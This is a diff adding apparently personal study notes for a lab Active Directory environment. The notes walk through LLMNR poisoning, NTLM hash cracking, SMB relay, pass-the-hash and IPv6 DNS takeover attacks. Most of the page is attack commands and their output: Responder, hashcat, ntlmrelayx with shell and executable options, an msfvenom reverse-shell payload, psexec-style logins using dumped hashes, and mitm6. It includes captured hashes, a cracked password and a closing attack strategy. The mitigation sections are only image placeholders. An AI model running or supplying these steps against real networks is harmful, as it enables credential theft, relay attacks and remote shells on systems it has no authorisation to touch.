@@ -1,0 +1,197 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Initial Attack Vector</title>
+</head><body>1) LLMNR Poisoning<br/>
+<br/>
+LLMNR (Link Local Multicast Name Resolution) Used to identify hosts when DNS fails to do so<br/>
+Previously called NBT-NS<br/>
+Utilzes users username and NTLMv2 hash when responded to appropriately<br/>
+Man in The Middle Attack<br/>
+LLMNR is active by default(feature not a bug)<br/>
+#sudo responder -I eth0 -dwvP<br/>
+Password cracking uses GPU so do it on host OS as virtual machine only uses CPU<br/>
+<img src="image.png" /><br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+store the hash in hash.txt<br/>
+<br/>
+#hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt<br/>
+<br/>
+FCASTLE::MARVEL:3510b37ae6ade8c4:f58ac047b9bc37e6ec493ca355494eca:01010000000000001<br/>
+ea2bdb8c6d4d90171f972777aea430c0000000002000800420039003700320001001e00570049004e002<br/>
+d0054004700460039004d0031005a004400420048005a000400140042003900370032002e004c004f004<br/>
+30041004c0003003400570049004e002d0054004700460039004d0031005a004400420048005a002e004<br/>
+2003900370032002e004c004f00430041004c000500140042003900370032002e004c004f00430041004c<br/>
+00080030003000000000000000010000000020000058724487771650a813caf98121031b5a9611409fa91<br/>
+d2b97122684a09fd102d70a0010000000000000000000000000000000000009001800480054005400500<br/>
+02f0062007200670077007200670067000000000000000000:P@ssword<br/>
+<br/>
+Mitigation<br/>
+<br/>
+<img src="image 3.png" /><br/>
+<br/>
+<br/>
+2)SMB Relay<br/>
+Relay the hash to another machine and gain access to it<br/>
+<img src="image 4.png" /><br/>
+<br/>
+fcastle is admin on SPIDERMAN as well as PUNISHER<br/>
+SMB signing must be disabled or not enforced on the machine we are relaying the hash to<br/>
+<br/>
+First of all identify is SMB signing is disabled or off on the target(spiderman machine in this case)<br/>
+Can do that with Nessus or Nmap script<br/>
+Also in etc/responder/Responder.conf, turn off SMB and HTTP so the hashes are not just being &nbsp;captured but relayed<br/>
+<br/>
+when responder captures a hash, it forwards it to ntlmrelayx which then sends it to the target<br/>
+<br/>
+#nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24 -Pn<br/>
+to check whether smb signing enabled or not<br/>
+<br/>
+SMB signing enabled in domain controller<br/>
+<br/>
+#nmap --script=smb2-security-mode.nse -p445 192.168.57.27 -Pn<br/>
+PORT &nbsp; &nbsp;STATE SERVICE<br/>
+445/tcp open &nbsp;microsoft-ds<br/>
+<br/>
+Host script results:<br/>
+| smb2-security-mode: <br/>
+| &nbsp; 3:1:1: <br/>
+|_ &nbsp; &nbsp;Message signing enabled but not required<br/>
+<br/>
+not required in SPIDERMAN machine<br/>
+<br/>
+#impacket-ntlmrelayx -tf target.txt -smb2support<br/>
+-tf : target file containg IP of target to which we forward the hash<br/>
+OR <br/>
+#impacket-ntlmrelayx -t 192.168.57.27 -smb2support<br/>
+<br/>
+[*] Authenticating against smb://192.168.57.27 as MARVEL/FCASTLE SUCCEED<br/>
+[*] Service RemoteRegistry is in stopped state<br/>
+[*] Service RemoteRegistry is disabled, enabling it<br/>
+[*] Starting service RemoteRegistry<br/>
+[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.57.26 controlled, but there are no more targets left!<br/>
+[*] Target system bootKey: 0x98aa35ceff09d8b17cd065f1e7d980d9<br/>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d0b242c83f473547e5dd3b675a709363:::<br/>
+peterparker:1001:aad3b435b51404eeaad3b435b51404ee:ead0cc57ddaae50d876b7dd6386fa9c7:::<br/>
+[*] Done dumping SAM hashes for host: 192.168.57.27<br/>
+<br/>
+#impacket-ntlmrelayx -t 192.168.57.27 -smb2support -c "whoami"<br/>
+-c : to run command<br/>
+<br/>
+#impacket-ntlmrelayx -t 192.168.57.27 -smb2support -i <br/>
+-i : get interactive shell<br/>
+<br/>
+#impacket-ntlmrelayx -t 192.168.57.27 -smb2support <br/>
+<br/>
+#impacket-ntlmrelayx -t 192.168.57.27 -smb2support -e shell.exe<br/>
+-e : run executable on target, can be used to get reverse shell<br/>
+<br/>
+generate shell.exe using<br/>
+#msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.57.5 LPORT=4444 -f exe -o shell.exe<br/>
+<br/>
+Mitigation<br/>
+<br/>
+<img src="image 5.png" /><br/>
+<br/>
+<br/>
+Gaining Shell Access<br/>
+<br/>
+<br/>
+<br/>
+Metasploit<br/>
+#msfconsole<br/>
+#seach psexec<br/>
+4 &nbsp; exploit/windows/smb/psexec<br/>
+<br/>
+#use 4<br/>
+<br/>
+#set payload windows/x64/meterpreter/reverse_tcp<br/>
+#set smbuser fcastle<br/>
+#set rhost 192.168.57.26<br/>
+#set smbpass P@ssword<br/>
+#show targets<br/>
+#set target Automatice / OR native <br/>
+#run<br/>
+<br/>
+OR<br/>
+&nbsp;to login locally, use SAM hash got from SPIDERMAN<br/>
+#unset smbdomain<br/>
+#set smbuser administraotr<br/>
+# set smbpass aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b<br/>
+first part before : is LM part and after : is NT part<br/>
+#unset smbdomain<br/>
+<br/>
+Not using metasploit<br/>
+<br/>
+#sudo psexec.py MARVEL.local/fcastle:'P@ssword'@192.168.57.26<br/>
+<br/>
+if cannot put Password inside &nbsp;' '<br/>
+<br/>
+do <br/>
+#sudo psexec.py MARVEL.local/fcastle:@192.168.57.26<br/>
+: is necessay after username<br/>
+and it will prompt for password afterwards<br/>
+<br/>
+#psexec.py administrator@192.168.57.27 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b<br/>
+OR <br/>
+#wmiexec.py administrator@192.168.57.27 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b<br/>
+OR<br/>
+#smbexec.py administrator@192.168.57.27 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b<br/>
+<br/>
+3) IPv6 Attack<br/>
+<br/>
+DNS takeover via IPv6<br/>
+Normally &nbsp;we use IPv4 and IPv6 isnt used at all, but it is turned on if we check in adapter settings<br/>
+So who does DNS for IPv6? Answer is Nobody<br/>
+attack machine acts like dns for ipv6<br/>
+So on attacker machine, we setup to respond to IPv6 packets<br/>
+When this happens, we can get authentication to Domain Controller via LDAP or SMB<br/>
+<br/>
+We can only relay NTLM hashes, not NTLMv2 hashes<br/>
+<br/>
+#impacket-ntlmrelayx -6 -t ldaps://192.168.57.25 -wh fakewpad.marvel.local -l lootme<br/>
+Point to Domain Controller<br/>
+-6:ipv6<br/>
+t:target<br/>
+-l:lootme folder we get<br/>
+<br/>
+#sudo mitm6 -d marvel.local<br/>
+<br/>
+reboot or login to a device<br/>
+<br/>
+*] HTTPD(80): Connection from ::ffff:192.168.57.26 controlled, attacking target ldaps://192.168.57.25<br/>
+[*] HTTPD(80): Client requested path: http://www.msftconnecttest.com/connecttest.txt<br/>
+[*] HTTPD(80): Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt<br/>
+[*] HTTPD(80): Authenticating against ldaps://192.168.57.25 as MARVEL/THEPUNISHER$ SUCCEED<br/>
+[*] Enumerating relayed user's privileges. This may take a while on large domains<br/>
+[*] HTTPD(80): Authenticating against ldaps://192.168.57.25 as MARVEL/THEPUNISHER$ SUCCEED<br/>
+[*] Domain info dumped into lootdir!<br/>
+<br/>
+<img src="image 6.png" /><br/>
+<br/>
+Can also check honepots, if they have no logins<br/>
+<br/>
+Login in any PC as MARVEL\administrator<br/>
+This creates a new user<br/>
+<br/>
+Mitigation <br/>
+<br/>
+<img src="image 7.png" /><br/>
+<br/>
+&nbsp; INITIAL ATTACK STRATEGY<br/>
+<br/>
+Start with either Responder or MITM6<br/>
+Run mitm6 only for 5-10 mins<br/>
+When running responder, also run scans like nessus or nmap to generate traffic<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
